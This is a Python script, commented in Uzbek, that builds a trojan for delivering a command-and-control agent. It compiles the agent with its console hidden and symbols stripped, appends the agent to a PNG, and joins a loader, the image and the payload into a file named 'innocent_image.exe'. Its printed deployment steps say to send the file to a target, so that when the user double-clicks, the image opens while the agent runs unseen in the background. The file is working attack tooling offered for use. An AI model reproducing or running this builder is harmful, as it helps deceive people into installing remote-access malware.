#!/usr/bin/env python3
"""
Image Steganography Builder
C agent kodini rasm ichiga yashirish va executable yaratish
"""

import os
import sys
import struct
import subprocess
from pathlib import Path

class ImageStegoBuilder:
    """Rasm ichiga payload yashirish"""
    
    MAGIC_START = b"===PAYLOAD_START==="
    MAGIC_END = b"===PAYLOAD_END==="
    
    def __init__(self):
        self.base_dir = Path(__file__).parent
        
    def compile_agent(self, source_file="agent.c", output_exe="agent.exe"):
        """C agent kodini kompilyatsiya qilish"""
        print(f"[*] Compiling agent: {source_file}")
        
        # MinGW yoki MSVC bilan kompilyatsiya
        compile_cmd = [
            "gcc",
            "-o", output_exe,
            source_file,
            "-lws2_32",
            "-mwindows",  # GUI rejimi (console yashirish)
            "-O2",  # Optimization
            "-s"  # Strip symbols
        ]
        
        try:
            result = subprocess.run(compile_cmd, capture_output=True, text=True)
            if result.returncode == 0:
                print(f"[+] Agent compiled: {output_exe}")
                return True
            else:
                print(f"[-] Compilation failed:\n{result.stderr}")
                return False
        except FileNotFoundError:
            print("[-] GCC not found. Install MinGW-w64")
            return False
    
    def compile_loader(self, output_exe="loader.exe"):
        """Image loader kompilyatsiya qilish"""
        print(f"[*] Compiling image loader")
        
        compile_cmd = [
            "gcc",
            "-o", output_exe,
            "image_loader.c",
            "-mwindows",
            "-O2",
            "-s"
        ]
        
        try:
            result = subprocess.run(compile_cmd, capture_output=True, text=True)
            if result.returncode == 0:
                print(f"[+] Loader compiled: {output_exe}")
                return True
            else:
                print(f"[-] Loader compilation failed:\n{result.stderr}")
                return False
        except FileNotFoundError:
            print("[-] GCC not found")
            return False
    
    def hide_payload_in_image(self, image_path, payload_path, output_path):
        """
        Payload'ni rasm ichiga yashirish
        
        Struktura:
        [Original Image Data]
        [MAGIC_START]
        [Payload Size: 4 bytes]
        [Payload Data]
        [MAGIC_END]
        """
        print(f"\n[*] Hiding payload in image...")
        
        # Rasmni o'qish
        with open(image_path, 'rb') as f:
            image_data = f.read()
        
        # Payload'ni o'qish
        with open(payload_path, 'rb') as f:
            payload_data = f.read()
        
        payload_size = len(payload_data)
        
        print(f"  [+] Image size: {len(image_data)} bytes")
        print(f"  [+] Payload size: {payload_size} bytes")
        
        # Birlashtirish
        combined = (
            image_data +
            self.MAGIC_START +
            struct.pack('<I', payload_size) +  # 4-byte little-endian size
            payload_data +
            self.MAGIC_END
        )
        
        # PNG sifatida saqlash
        if not output_path.endswith('.png'):
            output_path = output_path.rsplit('.', 1)[0] + '.png'
        
        with open(output_path, 'wb') as f:
            f.write(combined)
        
        print(f"\n✅ Steganography completed!")
        print(f"  Output: {output_path}")
        print(f"  Total size: {len(combined):,} bytes")
        
        return output_path
    
    def create_executable_image(self, image_path, payload_path, output_path):
        """
        Rasm + loader = executable fayl yaratish
        Faylni ikki marta bosish bilan rasm ochiladi va payload ishga tushadi
        """
        print(f"\n[*] Creating executable image...")
        
        # Loader EXE ni o'qish
        loader_path = "loader.exe"
        if not os.path.exists(loader_path):
            print(f"[-] Loader not found: {loader_path}")
            return None
        
        with open(loader_path, 'rb') as f:
            loader_data = f.read()
        
        # Rasmni o'qish
        with open(image_path, 'rb') as f:
            image_data = f.read()
        
        # Payload'ni o'qish
        with open(payload_path, 'rb') as f:
            payload_data = f.read()
        
        # Birlashtirish: [Loader EXE] + [Image] + [MAGIC] + [Payload]
        combined = (
            loader_data +
            image_data +
            self.MAGIC_START +
            struct.pack('<I', len(payload_data)) +
            payload_data +
            self.MAGIC_END
        )
        
        # .exe sifatida saqlash
        if not output_path.endswith('.exe'):
            output_path = output_path.rsplit('.', 1)[0] + '.exe'
        
        with open(output_path, 'wb') as f:
            f.write(combined)
        
        print(f"\n✅ Executable image created!")
        print(f"  Output: {output_path}")
        print(f"  Size: {len(combined):,} bytes")
        print(f"\n💡 Usage: Double-click {output_path}")
        print(f"   → Image will open")
        print(f"   → Payload runs in background")
        
        return output_path
    
    def extract_payload(self, stego_file, output_file):
        """Rasmdan payload chiqarish (test uchun)"""
        print(f"[*] Extracting payload from: {stego_file}")
        
        with open(stego_file, 'rb') as f:
            data = f.read()
        
        # MAGIC_START ni topish
        start_pos = data.find(self.MAGIC_START)
        if start_pos == -1:
            print("[-] No payload found")
            return False
        
        # Payload hajmini o'qish
        size_pos = start_pos + len(self.MAGIC_START)
        payload_size = struct.unpack('<I', data[size_pos:size_pos+4])[0]
        
        # Payload'ni chiqarish
        payload_start = size_pos + 4
        payload_data = data[payload_start:payload_start + payload_size]
        
        # Saqlash
        with open(output_file, 'wb') as f:
            f.write(payload_data)
        
        print(f"[+] Payload extracted: {output_file} ({payload_size} bytes)")
        return True


def main():
    builder = ImageStegoBuilder()
    
    print("=" * 60)
    print("  Image Steganography Builder for C2 Agent")
    print("=" * 60)
    
    # 1. Agent kompilyatsiya qilish
    print("\n[STEP 1] Compiling agent...")
    if not builder.compile_agent("agent.c", "agent.exe"):
        print("[-] Failed to compile agent")
        return
    
    # 2. Loader kompilyatsiya qilish
    print("\n[STEP 2] Compiling loader...")
    if not builder.compile_loader("loader.exe"):
        print("[-] Failed to compile loader")
        return
    
    # 3. Test rasmi
    test_image = input("\n[STEP 3] Enter image path (e.g., test.png): ").strip()
    if not os.path.exists(test_image):
        print(f"[-] Image not found: {test_image}")
        return
    
    # 4. Rasm ichiga yashirish
    print("\n[STEP 4] Building steganography image...")
    
    # Variant 1: Oddiy PNG (faqat payload yashirilgan)
    output_png = "stego_image.png"
    builder.hide_payload_in_image(test_image, "agent.exe", output_png)
    
    # Variant 2: Executable image (ikki marta bosish)
    output_exe = "innocent_image.exe"
    builder.create_executable_image(test_image, "agent.exe", output_exe)
    
    print("\n" + "=" * 60)
    print("✅ BUILD COMPLETED!")
    print("=" * 60)
    print(f"\nFiles created:")
    print(f"  1. {output_png} - PNG with hidden payload")
    print(f"  2. {output_exe} - Executable image (double-click to run)")
    print(f"\nDeployment:")
    print(f"  → Send {output_exe} to target")
    print(f"  → User clicks → image opens + agent runs")


if __name__ == "__main__":
    main()
